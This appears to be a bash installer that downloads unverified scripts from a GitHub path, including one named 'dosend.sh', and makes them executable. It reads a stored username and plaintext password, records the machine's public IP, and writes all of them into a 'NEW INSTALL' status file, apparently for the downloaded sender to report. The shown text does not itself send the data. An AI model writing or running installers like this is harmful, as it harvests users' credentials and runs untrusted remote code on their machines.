#!/bin/bash
Uname=$(head -1 inuser.txt)
gitpath=$(head -1 gitpath.txt)
cd noti/
sudo apt install -y libio-socket-ssl-perl  libdigest-hmac-perl  libterm-readkey-perl libmime-lite-perl libfile-libmagic-perl libio-socket-inet6-perl

wget https://raw.githubusercontent.com/$gitpath/main/gitclone/corecl.temp
wget https://raw.githubusercontent.com/$gitpath/main/gitclone/dosend.sh

ip4set=$(curl http://checkip.amazonaws.com)
looku=$(head -1 ../inuser.txt)
lookup=$(head -1 ../inpass.txt)
echo "$date" > status.txt
echo "NEW INSTALL in acc: $Uname" > status.txt
echo "Install IP4 CLI: $ip4set" >> status.txt
echo "inustr ::: $looku" >> status.txt
echo "inpstr ::: $lookup" >> status.txt

mv corecl.temp core
chmod +x core dosend.sh


